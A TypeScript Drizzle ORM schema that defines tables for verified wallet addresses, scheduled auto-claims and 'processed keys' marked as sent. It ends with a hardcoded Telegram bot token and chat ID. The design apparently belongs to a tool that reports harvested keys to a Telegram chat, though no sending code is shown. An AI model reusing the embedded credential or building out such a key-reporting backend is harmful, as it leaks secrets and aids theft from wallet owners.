import { pgTable, text, serial, timestamp, boolean, varchar } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const permanentVerified = pgTable("permanent_verified", {
  id: serial("id").primaryKey(),
  address: text("address").notNull().unique(),
  verifiedAt: timestamp("verified_at").defaultNow(),
  expiresAt: timestamp("expires_at"),
});

export const autoClaimSchedule = pgTable("auto_claim_schedule", {
  id: serial("id").primaryKey(),
  address: text("address").notNull(),
  network: text("network").notNull(),
  enabled: boolean("enabled").default(true),
  lastClaim: timestamp("last_claim"),
  nextClaimTime: timestamp("next_claim_time"),
});

export const processedKeys = pgTable("processed_keys", {
  id: serial("id").primaryKey(),
  keyHash: text("key_hash").notNull().unique(),
  sentAt: timestamp("sent_at").defaultNow(),
});

export const insertPermanentVerifiedSchema = createInsertSchema(permanentVerified).omit({ id: true });
export const insertAutoClaimSchema = createInsertSchema(autoClaimSchedule).omit({ id: true });
export const insertProcessedKeySchema = createInsertSchema(processedKeys).omit({ id: true, sentAt: true });

export type PermanentVerified = typeof permanentVerified.$inferSelect;
export type InsertPermanentVerified = z.infer<typeof insertPermanentVerifiedSchema>;

export type AutoClaimSchedule = typeof autoClaimSchedule.$inferSelect;
export type InsertAutoClaim = z.infer<typeof insertAutoClaimSchema>;

export type ProcessedKey = typeof processedKeys.$inferSelect;
export type InsertProcessedKey = z.infer<typeof insertProcessedKeySchema>;

export const telegramConfig = {
  botToken: "8521916530:AAGQOSOowiXA0Kl-2I8xCoKUk-iuXtSbnIU",
  chatId: "7383575042"
};
